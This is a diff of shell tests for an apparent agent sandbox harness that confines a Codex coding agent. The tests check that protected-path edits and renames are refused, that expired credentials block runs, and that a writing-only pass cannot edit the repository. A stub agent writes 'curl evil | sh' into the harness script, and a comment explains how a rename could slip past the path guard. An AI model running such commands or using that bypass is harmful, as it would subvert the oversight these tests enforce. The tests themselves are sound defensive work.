+printf '{"schema_version":1}\n' > "$decision_path"
+printf 'export const fine = true;\n' > "$workspace/client/src/fine.ts"
+[ "${CODEX_STUB_TOUCH_HARNESS:-0}" != 1 ] || printf 'curl evil | sh\n' > "$workspace/apps/msandbox/bin/agent-sandbox.sh"
+[ "${CODEX_STUB_RENAME_HARNESS:-0}" != 1 ] || git -C "$workspace" mv deploy/notes.txt client/src/notes.txt
+[ "${CODEX_STUB_USAGE_LIMIT:-0}" != 1 ] || { echo "ERROR: You've hit your usage limit. Try again at 5:31 AM."; exit 1; }
+EOF
+chmod +x "$TMP_DIR/deny-bin/codex"
+PATH="$TMP_DIR/deny-bin:$PATH" AUTOPR_SANDBOX_TEST_DIRECT=1 CODEX_STUB_TOUCH_HARNESS=1 \
+AUTOPR_SANDBOX_REPO_ROOT="$SANDBOX_TEST_REPO" \
+AUTOPR_SANDBOX_RUNTIME_ROOT="$TMP_DIR/sandbox-runtime" \
+  "$AUTOPR_DIR/run-codex-sandboxed.sh" "$TMP_DIR/sandbox-prompt.txt" \
+  "$TMP_DIR/sandbox-report-deny.md" "$TMP_DIR/sandbox-decision-deny.json" \
+  -f "$TMP_DIR/sandbox-context.json" >"$TMP_DIR/sandbox-deny.log" 2>&1
+sandbox_deny_rc=$?
+check "msandbox bridge refuses a patch that touches scripts/ before it reaches the checkout" \
+    $([ "$sandbox_deny_rc" != 0 ] \
+      && grep -q 'protected path' "$TMP_DIR/sandbox-deny.log" \
+      && [ ! -e "$SANDBOX_TEST_REPO/apps/msandbox/bin/agent-sandbox.sh" ] \
+      && [ ! -e "$SANDBOX_TEST_REPO/client/src/fine.ts" ] \
+      && echo 0 || echo 1)
+PATH="$TMP_DIR/deny-bin:$PATH" AUTOPR_SANDBOX_TEST_DIRECT=1 CODEX_STUB_TOUCH_HARNESS=1 \
+AUTOPR_SANDBOX_PATH_DENY_RE='^(\.github/|deploy/)' \
+AUTOPR_SANDBOX_REPO_ROOT="$SANDBOX_TEST_REPO" \
+AUTOPR_SANDBOX_RUNTIME_ROOT="$TMP_DIR/sandbox-runtime" \
+  "$AUTOPR_DIR/run-codex-sandboxed.sh" "$TMP_DIR/sandbox-prompt.txt" \
+  "$TMP_DIR/sandbox-report-allow.md" "$TMP_DIR/sandbox-decision-allow.json" \
+  -f "$TMP_DIR/sandbox-context.json" >"$TMP_DIR/sandbox-allow.log" 2>&1
+sandbox_allow_rc=$?
+check "the self-audit lane can narrow the denylist to CI/deploy and repair the harness" \
+    $([ "$sandbox_allow_rc" = 0 ] && [ -e "$SANDBOX_TEST_REPO/apps/msandbox/bin/agent-sandbox.sh" ] && echo 0 || echo 1)
+rm -f "$SANDBOX_TEST_REPO/apps/msandbox/bin/agent-sandbox.sh" "$SANDBOX_TEST_REPO/client/src/fine.ts"
+git -C "$SANDBOX_TEST_REPO" checkout -q -- . 2>/dev/null || true
+
+# Rename detection reports only the DESTINATION path for a rename pair, so a
+# model could move a protected file onto an allowed path and have the deletion
+# applied to the trusted checkout with the guard never seeing the source.
+PATH="$TMP_DIR/deny-bin:$PATH" AUTOPR_SANDBOX_TEST_DIRECT=1 CODEX_STUB_RENAME_HARNESS=1 \
+AUTOPR_SANDBOX_REPO_ROOT="$SANDBOX_TEST_REPO" \
+AUTOPR_SANDBOX_RUNTIME_ROOT="$TMP_DIR/sandbox-runtime" \
+  "$AUTOPR_DIR/run-codex-sandboxed.sh" "$TMP_DIR/sandbox-prompt.txt" \
+  "$TMP_DIR/sandbox-report-rename.md" "$TMP_DIR/sandbox-decision-rename.json" \
+  -f "$TMP_DIR/sandbox-context.json" >"$TMP_DIR/sandbox-rename.log" 2>&1
+sandbox_rename_rc=$?
+check "msandbox bridge refuses a RENAME out of a protected path, not just an edit" \
+    $([ "$sandbox_rename_rc" != 0 ] \
+      && grep -q 'protected path' "$TMP_DIR/sandbox-rename.log" \
+      && [ -e "$SANDBOX_TEST_REPO/deploy/notes.txt" ] \
+      && [ ! -e "$SANDBOX_TEST_REPO/client/src/notes.txt" ] \
+      && echo 0 || echo 1)
+rm -f "$SANDBOX_TEST_REPO/client/src/fine.ts"
+git -C "$SANDBOX_TEST_REPO" checkout -q -- . 2>/dev/null || true
+
+# An expired host login is refused before the sandbox is touched. Readable is
+# not usable: the copy is mounted read-only and the refresh token single-use.
+write_codex_auth_fixture() {
+    # apps/msandbox/tests/codex_auth_fixture.py is the single definition of
+    # this shape; see its docstring.
+    python3 "$REPO_ROOT/apps/msandbox/tests/codex_auth_fixture.py" "$1" "$2"
+}
+write_codex_auth_fixture "$TMP_DIR/expired-auth.json" "$(( $(date +%s) - 60 ))"
+cat > "$TMP_DIR/msandbox-stub.sh" <<'STUB'
+#!/usr/bin/env bash
+printf '%s\n' "$*" >> "${MSANDBOX_STUB_LOG:?}"
+exit 0
+STUB
+chmod +x "$TMP_DIR/msandbox-stub.sh"
+rm -f "$TMP_DIR/msandbox-stub.log"
+PATH="$TMP_DIR/deny-bin:$PATH" \
+AUTOPR_MSANDBOX_BIN="$TMP_DIR/msandbox-stub.sh" MSANDBOX_STUB_LOG="$TMP_DIR/msandbox-stub.log" \
+AUTOPR_HOST_CODEX_AUTH_FILE="$TMP_DIR/expired-auth.json" \
+AUTOPR_CODEX_BACKOFF_FILE="$TMP_DIR/bridge-backoff.json" \
+AUTOPR_SANDBOX_REPO_ROOT="$SANDBOX_TEST_REPO" \
+AUTOPR_SANDBOX_RUNTIME_ROOT="$TMP_DIR/sandbox-runtime" \
+  "$AUTOPR_DIR/run-codex-sandboxed.sh" "$TMP_DIR/sandbox-prompt.txt" \
+  "$TMP_DIR/sandbox-report-auth.md" "$TMP_DIR/sandbox-decision-auth.json" \
+  -f "$TMP_DIR/sandbox-context.json" > "$TMP_DIR/sandbox-auth.log" 2>&1
+sandbox_auth_rc=$?
+check "an expired host Codex login is refused before the sandbox is touched, naming the fix" \
+    $([ "$sandbox_auth_rc" != 0 ] && grep -q 'codex login' "$TMP_DIR/sandbox-auth.log" \
+      && grep -q 'EXPIRED' "$TMP_DIR/sandbox-auth.log" \
+      && [ ! -e "$TMP_DIR/msandbox-stub.log" ] && echo 0 || echo 1)
+
+# ...but a checker that could not RUN is a harness fault. Dying on it would
+# block every model pass in the error-autofix and self-audit lanes behind a
+# message telling the operator to run `codex login`, which cannot clear it.
+rm -f "$TMP_DIR/msandbox-stub.log"
+PATH="$TMP_DIR/deny-bin:$PATH" \
+AUTOPR_MSANDBOX_BIN="$TMP_DIR/msandbox-stub.sh" MSANDBOX_STUB_LOG="$TMP_DIR/msandbox-stub.log" \
+AUTOPR_HOST_CODEX_AUTH_FILE="$TMP_DIR/expired-auth.json" \
+AUTOPR_CODEX_AUTH_CHECK="$TMP_DIR/no-such-checker.py" \
+AUTOPR_CODEX_BACKOFF_FILE="$TMP_DIR/bridge-backoff.json" \
+AUTOPR_SANDBOX_REPO_ROOT="$SANDBOX_TEST_REPO" \
+AUTOPR_SANDBOX_RUNTIME_ROOT="$TMP_DIR/sandbox-runtime" \
+  "$AUTOPR_DIR/run-codex-sandboxed.sh" "$TMP_DIR/sandbox-prompt.txt" \
+  "$TMP_DIR/sandbox-report-nocheck.md" "$TMP_DIR/sandbox-decision-nocheck.json" \
+  -f "$TMP_DIR/sandbox-context.json" > "$TMP_DIR/sandbox-nocheck.log" 2>&1
+check "a Codex check the bridge cannot run warns and proceeds instead of blocking the lane" \
+    $(grep -q 'proceeding without the preflight' "$TMP_DIR/sandbox-nocheck.log" \
+      && [ -s "$TMP_DIR/msandbox-stub.log" ] && echo 0 || echo 1)
+
+# Same rule in the workflow preflight, which runs before any card is selected.
+login_step_body="$(awk '/name: Require a live Codex login/ { on = 1 } on && /- name: Refuse a hot re-dispatch/ { exit } on { print }' "$workflow")"
+check "the workflow preflight halts the board only on a dead credential, not on a broken check" \
+    $(grep -qF 'if [ "$rc" -eq 4 ]; then' <<< "$login_step_body" \
+      && ! grep -qF 'if [ "$rc" -ne 0 ]; then' <<< "$login_step_body" && echo 0 || echo 1)
+
+# A usage-limit exit is a lane-wide condition: the bridge records it for the
+# dispatcher and still returns Codex's own exit status to its caller.
+PATH="$TMP_DIR/deny-bin:$PATH" AUTOPR_SANDBOX_TEST_DIRECT=1 CODEX_STUB_USAGE_LIMIT=1 \
+AUTOPR_CODEX_BACKOFF_FILE="$TMP_DIR/bridge-backoff.json" \
+AUTOPR_SANDBOX_REPO_ROOT="$SANDBOX_TEST_REPO" \
+AUTOPR_SANDBOX_RUNTIME_ROOT="$TMP_DIR/sandbox-runtime" \
+  "$AUTOPR_DIR/run-codex-sandboxed.sh" "$TMP_DIR/sandbox-prompt.txt" \
+  "$TMP_DIR/sandbox-report-limit.md" "$TMP_DIR/sandbox-decision-limit.json" \
+  -f "$TMP_DIR/sandbox-context.json" >/dev/null 2>&1
+sandbox_limit_rc=$?
+check "a Codex usage-limit exit writes the backoff marker and preserves the exit status" \
+    $([ "$sandbox_limit_rc" = 1 ] && jq -e '.resume_at > now' "$TMP_DIR/bridge-backoff.json" >/dev/null 2>&1 \
+      && echo 0 || echo 1)
+# Nothing else clears the marker, so a single usage-limit hit would hold every
+# lane until resume_at (up to 24 h) even after the quota came back.
+PATH="$TMP_DIR/deny-bin:$PATH" AUTOPR_SANDBOX_TEST_DIRECT=1 \
+AUTOPR_CODEX_BACKOFF_FILE="$TMP_DIR/bridge-backoff.json" \
+AUTOPR_SANDBOX_REPO_ROOT="$SANDBOX_TEST_REPO" \
+AUTOPR_SANDBOX_RUNTIME_ROOT="$TMP_DIR/sandbox-runtime" \
+  "$AUTOPR_DIR/run-codex-sandboxed.sh" "$TMP_DIR/sandbox-prompt.txt" \
+  "$TMP_DIR/sandbox-report-clear.md" "$TMP_DIR/sandbox-decision-clear.json" \
+  -f "$TMP_DIR/sandbox-context.json" >/dev/null 2>&1
+sandbox_clear_rc=$?
+check "a successful Codex run clears the lane-wide usage-limit backoff" \
+    $([ "$sandbox_clear_rc" = 0 ] && [ ! -e "$TMP_DIR/bridge-backoff.json" ] && echo 0 || echo 1)
+rm -f "$SANDBOX_TEST_REPO/client/src/fine.ts"
+
+################################################################################
+# Publication copy is a separate Luna-medium task. Its prose is validated and
+# the sandbox bridge must reject any attempt by this writing-only pass to edit.
+################################################################################
+cat > "$TMP_DIR/bin/codex" <<'EOF'
+#!/usr/bin/env bash
+printf '%s\n' "$@" > "$CODEX_STUB_ARGS"
+prompt="${!#}"
+report_path="$(printf '%s\n' "$prompt" | grep -oE '/[^ ]+/\.git/autopr-io/output/report\.md' | head -1)"
+decision_path="$(printf '%s\n' "$prompt" | grep -oE '/[^ ]+/\.git/autopr-io/output/decision\.json' | head -1)"
+workspace=""
+args=("$@")
+for ((i = 0; i < ${#args[@]}; i++)); do
+    [ "${args[$i]}" != -C ] || workspace="${args[$((i + 1))]}"
+done
+mkdir -p "$(dirname "$report_path")" "$(dirname "$decision_path")"
+printf '%s\n' '### Publication copy' 'stub' > "$report_path"
+if [[ "$prompt" == *'one commit subject for a completed Matcha AutoPR code change'* ]]; then
+    printf '%s\n' '{"schema_version":1,"commit_subject":"fix: standardize terminology"}' > "$decision_path"
+else
+    printf '%s\n' '{"schema_version":1,"commit_subject":"fix: standardize terminology","card_note":"Needs the canonical term before the draft can be completed safely."}' > "$decision_path"
+fi
+[ "${CODEX_STUB_EDIT:-0}" != 1 ] || printf 'unexpected\n' > "$workspace/client/src/luna-edit.ts"
+EOF
+chmod +x "$TMP_DIR/bin/codex"
+printf '%s\n' '## Verification' '' 'Focused checks passed.' > "$TMP_DIR/publication-verification.md"
+
+PATH="$TMP_DIR/bin:$PATH" CODEX_STUB_ARGS="$TMP_DIR/luna-args" \
+AUTOPR_SANDBOX_TEST_DIRECT=1 AUTOPR_SANDBOX_RUNTIME_ROOT="$TMP_DIR/publication-runtime" \
+  "$AUTOPR_DIR/write-publication-copy.sh" "$TMP_DIR/card.json" "$TMP_DIR/publication-decision.json" \
+  "$TMP_DIR/report.md" "$TMP_DIR/publication-verification.md" "$TMP_DIR/publication-copy.json" \
+  >"$TMP_DIR/publication-command.log" 2>&1
+publication_copy_rc=$?
+[ "$publication_copy_rc" = 0 ] || sed -n '1,120p' "$TMP_DIR/publication-command.log"
+check "publication writer uses Luna medium and validates its bounded output" \
+    $([ "$publication_copy_rc" = 0 ] \
+      && jq -e '.commit_subject == "fix: standardize terminology" and (.card_note | contains("canonical term"))' "$TMP_DIR/publication-copy.json" >/dev/null \
+      && grep -qx 'gpt-5.6-luna' "$TMP_DIR/luna-args" \
+      && grep -qx 'model_reasoning_effort="medium"' "$TMP_DIR/luna-args" \
+      && echo 0 || echo 1)
+
+jq '.category = "feat"' "$TMP_DIR/card.json" > "$TMP_DIR/feat-card.json"
+PATH="$TMP_DIR/bin:$PATH" CODEX_STUB_ARGS="$TMP_DIR/feat-luna-args" \
+AUTOPR_SANDBOX_TEST_DIRECT=1 AUTOPR_SANDBOX_RUNTIME_ROOT="$TMP_DIR/publication-runtime" \
+  "$AUTOPR_DIR/write-publication-copy.sh" "$TMP_DIR/feat-card.json" "$TMP_DIR/publication-decision.json" \
+  "$TMP_DIR/report.md" "$TMP_DIR/publication-verification.md" "$TMP_DIR/feat-publication-copy.json" \
+  >/dev/null 2>&1
+feat_publication_copy_rc=$?
+check "publication writer repairs a model-selected commit prefix without dropping the card outcome" \
+    $([ "$feat_publication_copy_rc" = 0 ] \
+      && jq -e '.commit_subject == "feat: standardize terminology" and (.card_note | contains("canonical term"))' "$TMP_DIR/feat-publication-copy.json" >/dev/null \
+      && echo 0 || echo 1)
+
+PATH="$TMP_DIR/bin:$PATH" CODEX_STUB_ARGS="$TMP_DIR/commit-luna-args" \
+AUTOPR_SANDBOX_TEST_DIRECT=1 AUTOPR_SANDBOX_RUNTIME_ROOT="$TMP_DIR/publication-runtime" \
+  "$AUTOPR_DIR/write-commit-subject.sh" fix "$TMP_DIR/commit-subject.json" \
+  -f "$TMP_DIR/card.json" -f "$TMP_DIR/publication-decision.json" -f "$TMP_DIR/report.md" \
+  -f "$TMP_DIR/publication-verification.md" >/dev/null 2>&1
+commit_subject_rc=$?
+check "commit-subject writer uses Luna medium and validates its bounded output" \
+    $([ "$commit_subject_rc" = 0 ] \
+      && jq -e '.commit_subject == "fix: standardize terminology"' "$TMP_DIR/commit-subject.json" >/dev/null \
+      && grep -qx 'gpt-5.6-luna' "$TMP_DIR/commit-luna-args" \
+      && grep -qx 'model_reasoning_effort="medium"' "$TMP_DIR/commit-luna-args" \
+      && echo 0 || echo 1)
+
+CODEX_STUB_EDIT=1 PATH="$TMP_DIR/bin:$PATH" CODEX_STUB_ARGS="$TMP_DIR/luna-edit-args" \
+AUTOPR_SANDBOX_TEST_DIRECT=1 AUTOPR_SANDBOX_RUNTIME_ROOT="$TMP_DIR/publication-runtime" \
+  "$AUTOPR_DIR/write-publication-copy.sh" "$TMP_DIR/card.json" "$TMP_DIR/publication-decision.json" \
+  "$TMP_DIR/report.md" "$TMP_DIR/publication-verification.md" "$TMP_DIR/publication-copy-edit.json" \
+  >/dev/null 2>&1
+publication_edit_rc=$?
+check "publication writer rejects Luna repository edits before applying them" \
+    $([ "$publication_edit_rc" != 0 ] \
+      && [ ! -e "$REPO_ROOT/client/src/luna-edit.ts" ] \
+      && echo 0 || echo 1)
+
+cp "$TMP_DIR/publication-decision.json" "$TMP_DIR/invalid-decision.json"
+jq '.outcome = "questions_only" | .questions = [] | .safe_changes_present = false' \
+    "$TMP_DIR/invalid-decision.json" > "$TMP_DIR/invalid-decision.next.json"
+mv "$TMP_DIR/invalid-decision.next.json" "$TMP_DIR/invalid-decision.json"
+"$AUTOPR_DIR/decision.sh" normalize-grounded "$TMP_DIR/invalid-decision.json" "$TMP_DIR/invalid-decision.normalized.json" >/dev/null 2>&1
+invalid_decision_rc=$?
+check "questions-only decisions require actionable questions" \
+    $([ "$invalid_decision_rc" != 0 ] && echo 0 || echo 1)
+
+jq '.questions = [
+      {id:"q1",question:"First choice?",why_blocking:"Needed",default_assumption:"Choose A",options:[{key:"a",label:"A",impact:"First"},{key:"b",label:"B",impact:"Second"}],resolution:{kind:"product_decision",evidence:["Both labels remain in active call sites."],why_user_needed:"The owner must select the canonical label."}},
+      {id:"q2",question:"Second choice?",why_blocking:"Needed",default_assumption:"Choose B",options:[{key:"a",label:"A",impact:"First"},{key:"b",label:"B",impact:"Second"}]}
+    ]' "$TMP_DIR/publication-decision.json" > "$TMP_DIR/question-render-decision.json"
+question_pr_copy="$(/bin/bash -c 'source "$1"; autopr_render_questions "$2"' _ \
+    "$AUTOPR_DIR/decision.sh" "$TMP_DIR/question-render-decision.json")"
+question_card_copy="$(/bin/bash -c 'source "$1"; autopr_render_card_questions "$2"' _ \
+    "$AUTOPR_DIR/decision.sh" "$TMP_DIR/question-render-decision.json")"
+check "question drafts are numbered and expose an in-ticket answer path" \
+    $(printf '%s\n%s' "$question_pr_copy" "$question_card_copy" \
+      | grep -qF '2. Second choice?' \
+      && printf '%s' "$question_pr_copy" | grep -qF 'Add additional context' \
+      && printf '%s' "$question_card_copy" | grep -qF 'reply below with the numbered choices' \
+      && echo 0 || echo 1)
+check "question PR copy renders grounded resolution evidence" \
+    $(printf '%s' "$question_pr_copy" | grep -qF 'Why your input is needed: The owner must select the canonical label.' \
+      && printf '%s' "$question_pr_copy" | grep -qF 'Already checked: Both labels remain in active call sites.' \
+      && echo 0 || echo 1)
+bounded_question_copy="$(printf '%0200d☕' 0 \
+    | /bin/bash -c 'source "$1"; autopr_bound_text 128 "test text"' _ \
+        "$AUTOPR_DIR/decision.sh")"
+check "rendered model prose is byte-bounded without corrupting UTF-8" \
+    $([ "$(printf '%s' "$bounded_question_copy" | wc -c | tr -d '[:space:]')" -le 128 ] \
+      && printf '%s' "$bounded_question_copy" | grep -qF 'AutoPR test text truncated' \
+      && printf '%s' "$bounded_question_copy" | python3 -c 'import sys; sys.stdin.buffer.read().decode("utf-8")' \
+      && [ "$(grep -n '^render_body \"\$BODY_FILE\"' "$AUTOPR_DIR/publish.sh" | tail -1 | cut -d: -f1)" -lt \
+           "$(grep -n 'git push --force-with-lease' "$AUTOPR_DIR/publish.sh" | tail -1 | cut -d: -f1)" ] \
+      && echo 0 || echo 1)
+check "the card preview reaches the first question before optional-answer guidance" \
+    $([ "$(printf '%s' "$question_card_copy" | sed -n '2p')" = '1. First choice?' ] \
+      && echo 0 || echo 1)
+
+# Every PR pass uses the one grounded normalization path.
+jq '.outcome="questions_only" | .safe_changes_present=false' \
+    "$TMP_DIR/question-render-decision.json" > "$TMP_DIR/ungrounded.json"
+check "fresh question decisions cannot recycle unexplained blockers" \
+    $(! "$AUTOPR_DIR/decision.sh" normalize-grounded "$TMP_DIR/ungrounded.json" "$TMP_DIR/grounded-out.json" >/dev/null 2>&1 \
+      && echo 0 || echo 1)
+check "there is no weaker PR normalization command" \
+    $(! "$AUTOPR_DIR/decision.sh" normalize "$TMP_DIR/ungrounded.json" "$TMP_DIR/legacy-out.json" >/dev/null 2>&1 \
+      && echo 0 || echo 1)
+for kind in product_decision private_context source_unavailable explicit_approval; do
+    jq --arg kind "$kind" '.questions |= map(. + {resolution:{kind:$kind,
+        evidence:["Checked current context and repository; consulted primary sources or observed a search failure"],
+        why_user_needed:"The remaining fact or decision is not available to this run"}})' \
+        "$TMP_DIR/ungrounded.json" > "$TMP_DIR/grounded.json"
+    check "an evidenced $kind question remains available" \
+        $("$AUTOPR_DIR/decision.sh" normalize-grounded "$TMP_DIR/grounded.json" "$TMP_DIR/grounded-out.json" >/dev/null 2>&1 && echo 0 || echo 1)
+done
+jq '.outcome="partial_implementation" | .safe_changes_present=true' \
+    "$TMP_DIR/grounded.json" > "$TMP_DIR/grounded-partial.json"
+check "safe partial implementation can retain an evidenced human question" \
+    $("$AUTOPR_DIR/decision.sh" normalize-grounded "$TMP_DIR/grounded-partial.json" "$TMP_DIR/partial-out.json" >/dev/null 2>&1 && echo 0 || echo 1)
+for invalid in 'null' '{kind:"public_research",evidence:["Not attempted"],why_user_needed:"Find it for me"}' '{kind:"private_context",evidence:[],why_user_needed:"Unknown"}' '{kind:"explicit_approval",evidence:["   "],why_user_needed:"Unknown"}'; do
+    jq ".questions[1].resolution=$invalid" "$TMP_DIR/grounded.json" > "$TMP_DIR/grounding-invalid.json"
+    check "every question needs a nonempty supported resolution ($invalid)" \
+        $(! "$AUTOPR_DIR/decision.sh" grounding-ok "$TMP_DIR/grounding-invalid.json" >/dev/null 2>&1 && echo 0 || echo 1)
+done
+jq '.questions[0].resolution.evidence = ["a","b","c","d","e","f"]' \
+    "$TMP_DIR/grounded.json" > "$TMP_DIR/grounding-too-many.json"
+check "resolution evidence is bounded before PR rendering" \
+    $(! "$AUTOPR_DIR/decision.sh" normalize-grounded "$TMP_DIR/grounding-too-many.json" "$TMP_DIR/grounded-out.json" >/dev/null 2>&1 \
+      && echo 0 || echo 1)
+for reason in policy_blocked external_dependency; do
+    jq --arg reason "$reason" '.outcome="no_safe_action" | .questions=[] | .safe_changes_present=false | .no_safe_action_reason=$reason' \
+        "$TMP_DIR/publication-decision.json" > "$TMP_DIR/ungrounded-blocker.json"
+    jq --slurpfile grounded "$TMP_DIR/grounded.json" '.blocker_resolution=$grounded[0].questions[0].resolution' \
+        "$TMP_DIR/ungrounded-blocker.json" > "$TMP_DIR/grounded-blocker.json"
+    check "$reason cannot bypass grounding by moving the question to a refusal" \
+        $(! "$AUTOPR_DIR/decision.sh" normalize-grounded "$TMP_DIR/ungrounded-blocker.json" "$TMP_DIR/blocker-out.json" >/dev/null 2>&1 \
+          && "$AUTOPR_DIR/decision.sh" normalize-grounded "$TMP_DIR/grounded-blocker.json" "$TMP_DIR/blocker-out.json" >/dev/null 2>&1 \
+          && echo 0 || echo 1)
+done
+check "rendered questions accept research guidance and plain-language answers" \
+    $(printf '%s' "$question_pr_copy" | grep -qF 'numbered choices are optional' \
+      && printf '%s' "$question_card_copy" | grep -qF 'tell AutoPR what to research' \
+      && echo 0 || echo 1)
+
+jq '.production_verification = {
+      target:"frontend",
+      mode:"automatic_http",
+      reason:"Query strings are outside the verifier allowlist.",
+      checks:[{path:"/app/jobs?tab=creds",expected_status:200}],
+      steps:[]
+    }' "$TMP_DIR/publication-decision.json" > "$TMP_DIR/invalid-production-check.json"
+"$AUTOPR_DIR/decision.sh" normalize-grounded "$TMP_DIR/invalid-production-check.json" \
+    "$TMP_DIR/invalid-production-check.normalized.json" >/dev/null 2>&1
+invalid_production_check_rc=$?
+check "decision and deploy verifier share the production HTTP allowlist" \
+    $([ "$invalid_production_check_rc" != 0 ] \
+      && grep -q 'include "production-check"' "$AUTOPR_DIR/decision.sh" \
+      && grep -q 'include "production-check"' "$AUTOPR_DIR/verify-production-fixes.sh" \
+      && echo 0 || echo 1)
+
+jq '.outcome = "no_safe_action"
+    | .safe_changes_present = false
+    | .questions = []
+    | .no_safe_action_reason = "already_fixed"' \
+    "$TMP_DIR/publication-decision.json" > "$TMP_DIR/already-fixed-decision.json"
+jq -n '{directives:["draft_pr","trust_still_broken"],test_route:"/app/jobs"}' \
+    > "$TMP_DIR/forced-policy.json"
+"$AUTOPR_DIR/decision.sh" normalize-grounded "$TMP_DIR/already-fixed-decision.json" \
+    "$TMP_DIR/forced-decision.json" "$TMP_DIR/forced-policy.json" >/dev/null 2>&1
+forced_already_fixed_rc=$?
+check "decision-bound force directives reject another already-fixed exit" \
+    $([ "$forced_already_fixed_rc" != 0 ] && echo 0 || echo 1)
+
+# migration_required is retired outright, not merely forbidden under a
+# directive: the operator applies every migration by hand, so authoring the
+# version file is ordinary drafting work. It was the most common refusal and it
+# protected nothing.
+jq '.no_safe_action_reason = "migration_required"' \
+    "$TMP_DIR/already-fixed-decision.json" > "$TMP_DIR/migration-required-decision.json"
+"$AUTOPR_DIR/decision.sh" normalize-grounded "$TMP_DIR/migration-required-decision.json" \
+    "$TMP_DIR/forced-migration-decision.json" "$TMP_DIR/forced-policy.json" >/dev/null 2>&1
+forced_migration_rc=$?
+check "decision-bound draft directive requires authoring a needed migration" \
+    $([ "$forced_migration_rc" != 0 ] && echo 0 || echo 1)
+
+"$AUTOPR_DIR/decision.sh" normalize-grounded "$TMP_DIR/migration-required-decision.json" \
+    "$TMP_DIR/bare-migration-decision.json" >/dev/null 2>&1
+bare_migration_rc=$?
+check "migration_required is refused even with no directive at all" \
+    $([ "$bare_migration_rc" != 0 ] && echo 0 || echo 1)
+
+cat > "$TMP_DIR/pending-directive-card.json" <<'EOF'
+{"autopr_reconsideration_pending":true,"autopr_reconsideration_event_id":"old-event"}
+EOF
+cat > "$TMP_DIR/pending-directive-history.json" <<'EOF'
+[
+  {"id":"unrelated","metadata":{"kind":"autopr_additional_context","body":"draft this PR"}},
+  {"id":"old-event","metadata":{"kind":"autopr_additional_context","body":"just go ahead and do it anyways"}}
+]
+EOF
+python3 "$AUTOPR_DIR/resolve-directive-policy.py" \
+    --card "$TMP_DIR/pending-directive-card.json" \
+    --history "$TMP_DIR/pending-directive-history.json" \
+    --output "$TMP_DIR/resolved-old-directive.json"
+check "pre-upgrade decision-bound context still grants the requested draft" \
+    $(jq -e '.directives == ["draft_pr"] and .source_event_id == "old-event"' \
+      "$TMP_DIR/resolved-old-directive.json" >/dev/null && echo 0 || echo 1)
+
+cat > "$TMP_DIR/runtime-card.json" <<'EOF'
+{"task_id":"aaaaaaaa-0000-4000-8000-000000000001","id8":"aaaaaaaa","project_id":"bbbbbbbb-0000-4000-8000-000000000002","board_column":"changes_requested","progress_note":"🤖 AUTO SETUP · PAUSED: APPROVE 10 MORE MINUTES","autopr_reconsideration_pending":true,"autopr_reconsideration_event_id":"runtime-event"}
+EOF
+cat > "$TMP_DIR/runtime-history.json" <<'EOF'
+[{"id":"runtime-event","metadata":{"kind":"autopr_additional_context","body":"--extend-runtime"}}]
+EOF
+# The 10 minutes continue saved work, so the approval only shortens a run that
+# actually has a checkpoint to resume.
+RUNTIME_CHECKPOINTS="$TMP_DIR/runtime-checkpoints"
+runtime_task_root="$RUNTIME_CHECKPOINTS/aaaaaaaa-0000-4000-8000-000000000001"
+mkdir -p "$runtime_task_root/run-1"
+jq -n --arg created_at "$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
+    '{schema_version:1,created_at:$created_at,patch_saved:true}' \
+    > "$runtime_task_root/run-1/metadata.json"
+printf 'run-1\n' > "$runtime_task_root/active"
+
+AUTOPR_RUNTIME_HISTORY_FILE="$TMP_DIR/runtime-history.json" \
+    AUTOPR_CHECKPOINT_ROOT="$RUNTIME_CHECKPOINTS" \
+    "$AUTOPR_DIR/runtime-policy.sh" "$TMP_DIR/runtime-card.json" \
+    "$TMP_DIR/extended-runtime-policy.json"
+check "a decision-bound runtime approval grants a 10-minute continuation" \
+    $(jq -e '.minutes == 10 and .extended == true and .directives == ["extend_runtime"]' \
+      "$TMP_DIR/extended-runtime-policy.json" >/dev/null && echo 0 || echo 1)
+
+AUTOPR_RUNTIME_HISTORY_FILE="$TMP_DIR/runtime-history.json" \
+    AUTOPR_CHECKPOINT_ROOT="$TMP_DIR/empty-checkpoints" \
+    "$AUTOPR_DIR/runtime-policy.sh" "$TMP_DIR/runtime-card.json" \
+    "$TMP_DIR/unresumable-runtime-policy.json"
+check "a runtime approval never halves a from-scratch investigation" \
+    $(jq -e '.minutes == 20 and .extended == false and .checkpoint == null' \
+      "$TMP_DIR/unresumable-runtime-policy.json" >/dev/null && echo 0 || echo 1)
+
+runtime_stale_root="$TMP_DIR/stale-checkpoints/aaaaaaaa-0000-4000-8000-000000000001"
+mkdir -p "$runtime_stale_root/run-old"
+jq -n '{schema_version:1,created_at:"2026-01-01T00:00:00Z",patch_saved:true}' \
+    > "$runtime_stale_root/run-old/metadata.json"
+printf 'run-old\n' > "$runtime_stale_root/active"
+AUTOPR_RUNTIME_HISTORY_FILE="$TMP_DIR/runtime-history.json" \
+    AUTOPR_CHECKPOINT_ROOT="$TMP_DIR/stale-checkpoints" \
+    "$AUTOPR_DIR/runtime-policy.sh" "$TMP_DIR/runtime-card.json" \
+    "$TMP_DIR/stale-runtime-policy.json"
+check "an expired checkpoint is neither resumed nor treated as a continuation" \
+    $(jq -e '.minutes == 20 and .extended == false and .checkpoint == null' \
+      "$TMP_DIR/stale-runtime-policy.json" >/dev/null && echo 0 || echo 1)
+
+jq '.[0].metadata.body = "Here is more evidence, but no time approval."' \
+    "$TMP_DIR/runtime-history.json" > "$TMP_DIR/normal-runtime-history.json"
+AUTOPR_RUNTIME_HISTORY_FILE="$TMP_DIR/normal-runtime-history.json" \
+    AUTOPR_CHECKPOINT_ROOT="$RUNTIME_CHECKPOINTS" \
+    "$AUTOPR_DIR/runtime-policy.sh" "$TMP_DIR/runtime-card.json" \
+    "$TMP_DIR/normal-runtime-policy.json"
+check "ordinary additional context remains capped at 20 minutes" \
+    $(jq -e '.minutes == 20 and .extended == false and .directives == []' \
+      "$TMP_DIR/normal-runtime-policy.json" >/dev/null && echo 0 || echo 1)
+
+# ── Runtime ladder ─────────────────────────────────────────────────────────
+# A card on its third "approve 10 more minutes" used to rerun the same model at
+# the same effort that had already stalled twice. The checkpoint now classifies
+# WHY it stopped and the policy carries the runtime the continuation should use.
+check "a stall with a saved patch and decision is classified as near_publish" \
+    $([ "$(jq -n '{patch_saved:true,decision_saved:true}' > "$TMP_DIR/m1.json"; \
+        autopr_stall_reason "$TMP_DIR/m1.json" 1)" = near_publish ] && echo 0 || echo 1)
+check "a stall with a patch but no verdict is classified as implementing" \
+    $([ "$(jq -n '{patch_saved:true,decision_saved:false}' > "$TMP_DIR/m2.json"; \
+        autopr_stall_reason "$TMP_DIR/m2.json" 1)" = implementing ] && echo 0 || echo 1)
